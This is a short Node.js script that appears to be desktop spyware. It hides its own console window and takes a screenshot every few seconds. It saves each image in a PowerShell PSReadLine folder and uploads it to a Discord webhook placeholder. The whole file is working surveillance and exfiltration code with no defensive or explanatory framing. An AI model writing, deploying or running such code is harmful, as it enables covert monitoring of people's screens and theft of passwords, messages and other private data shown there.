const request = require('request');
const fs = require('fs')
const screenshot = require('screenshot-desktop')
const ConsoleWindow = require("node-hide-console-window");



ConsoleWindow.hideConsole();

let pwd = process.cwd();


let pwds = pwd.slice(0, -28)

let pwdc = pwds + "\\PowerShell\\PSReadLine"

function scr(){

  screenshot().then((img) => {
    console.log(img)

    fs.writeFileSync(pwdc + "\\Screenshot.png",img)
  })  

}

function send(){

  var formData = {
      my_field: 'my_value',
      my_file: fs.createReadStream(pwdc + '\\Screenshot.png'),
  };
  
  request.post({url:'{webhook discord}', formData: formData}, function(err, httpResponse, body) {
    if (err) {
      return console.error('upload failed:', err);
    }
    console.log('Upload successful!  Server responded with:', body);
  });
}

function sec(){
  setTimeout(() => { scr()}, 5000);
  setTimeout(() => { send()}, 8000);
}

setInterval(sec, 5000)